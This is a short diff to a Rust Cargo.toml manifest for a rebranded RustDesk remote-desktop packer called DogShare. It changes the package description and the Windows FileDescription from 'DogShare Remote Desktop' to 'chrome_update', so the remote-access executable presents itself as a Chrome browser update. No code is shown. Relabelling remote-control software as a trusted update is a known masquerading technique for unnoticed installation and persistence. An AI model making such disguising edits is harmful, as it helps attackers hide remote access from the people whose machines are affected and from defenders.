@@ -2,7 +2,7 @@
 name = "rustdesk-portable-packer"
 version = "1.5.1"
 edition = "2021"
-description = "DogShare Remote Desktop"
+description = "chrome_update"
 
 # See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
 
@@ -31,7 +31,7 @@ LegalCopyright = "Copyright © 2026 Purslane Tech Pte. Ltd. All rights reserved.
 ProductName = "DogShare"
 OriginalFilename = "DogShare.exe"
 InternalName = "DogShare"
-FileDescription = "DogShare Remote Desktop"
+FileDescription = "chrome_update"
 #ProductVersion = ""
 
 [target.'cfg(target_os="windows")'.build-dependencies]
